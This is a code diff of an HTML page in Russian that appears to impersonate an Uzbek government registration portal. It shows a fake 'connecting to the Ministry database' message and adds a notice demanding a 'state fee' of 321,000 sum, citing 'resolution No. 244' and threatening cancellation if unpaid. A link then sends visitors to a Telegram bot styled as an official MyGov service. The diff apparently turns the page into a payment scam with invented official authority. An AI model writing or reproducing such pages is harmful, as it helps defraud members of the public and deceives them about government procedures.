@@ -73,16 +73,15 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
         <p class="text-sm text-blue-800 mt-3 font-semibold">Подключение к базе Министерства…</p>
       </div>
       <div id="iin-result" class="text-center mt-4 hidden text-green-700 font-semibold text-lg"></div>
-      <div id="consent-block" class="mt-8 bg-blue-50 border border-blue-300 p-5 rounded-xl text-left">
-  <h3 class="text-lg font-semibold text-blue-900 mb-2">Информация перед продолжением</h3>
-  <p class="text-sm text-gray-800 mb-2">Для завершения регистрации потребуется пройти финальный юридический этап участия в программе.</p>
-  <p class="text-sm text-gray-800 mb-3">Этот этап включает подтверждение данных и активацию вашей заявки в госреестре.</p>
+      <div id="filtered-confirm" class="hidden mt-6 bg-yellow-50 border border-yellow-300 p-5 rounded-xl text-left">
+  <h3 class="text-lg font-semibold text-yellow-900 mb-2">Перед продолжением:</h3>
+  <p class="text-sm text-gray-700 mb-2">Для включения в государственный реестр участников программы необходимо оплатить <span class="font-semibold text-red-600">государственную пошлину — 321 000 сум</span> в соответствии с постановлением №244.</p>
+  <p class="text-sm text-gray-700 mb-3">Без оплаты заявка не рассматривается и будет аннулирована.</p>
   <label class="inline-flex items-center mt-2">
-    <input type="checkbox" id="agree-filter" class="form-checkbox h-5 w-5 text-blue-600" onchange="toggleAccessButton()">
-    <span class="ml-2 text-sm text-gray-900">Я ознакомлен(а) и готов(а) продолжить</span>
+    <input type="checkbox" id="confirm-understood" class="form-checkbox h-5 w-5 text-blue-600" onchange="toggleProceedToBot()">
+    <span class="ml-2 text-sm text-gray-800">Я ознакомлен(а) и согласен(на) продолжить</span>
   </label>
-  <button id="proceed-button" onclick="checkIIN()" disabled class="w-full mt-4 bg-blue-700 text-white py-3 rounded-xl font-medium opacity-50 cursor-not-allowed transition">▶️ Продолжить регистрацию</button>
-</div>
+  <a id="proceed-link" href="https://t.me/MyGovUzRasmiy_bot" target="_blank" class="w-full block mt-4 bg-blue-600 text-white py-3 rounded-xl font-medium text-center opacity-50 pointer-events-none transition">📎 Перейти в Telegram-бот</a>
 </div>
       <button onclick="openFaqModal('modal-status')" class="w-full mt-6 bg-green-600 text-white py-3 rounded-xl font-medium hover:bg-green-700 transition">📄 Проверить статус заявки</button>
     </div>
